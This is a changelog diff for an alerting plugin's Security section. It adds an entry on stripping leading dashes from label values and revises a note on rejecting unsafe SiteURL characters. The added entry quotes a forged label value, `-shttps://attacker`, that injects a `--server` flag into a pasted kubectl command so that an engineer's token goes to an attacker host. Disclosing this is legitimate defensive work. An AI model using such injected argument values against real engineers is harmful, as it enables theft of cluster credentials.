@@ -14,7 +14,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Security
 
-* A SiteURL containing characters that break markdown links, Alertmanager templates or quoted YAML (``( ) { } [ ] < > ' " ` \``, spaces or newlines) is no longer baked into runbook, icon and help links. The plugin shows the `CHANGE-ME` placeholder instead, so the bad SiteURL is visible.
+* Quick-diagnostic commands strip leading dashes from label values. A forged alert with `pod="-shttps://attacker"` could otherwise turn a pasted `kubectl get pod -n <ns> <pod>` into `--server https://attacker` and send the engineer's token there.
+* A SiteURL containing characters that break markdown links, Alertmanager templates or quoted YAML (``( ) { } < > ' " ` \``, whitespace, or any non-ASCII such as U+2028) is no longer baked into runbook, icon, help and webhook links. The plugin uses the `CHANGE-ME` placeholder instead and logs a warning once. IPv6 hosts such as `https://[::1]:8065` are still accepted.
 
 ### Bug Fixes
 
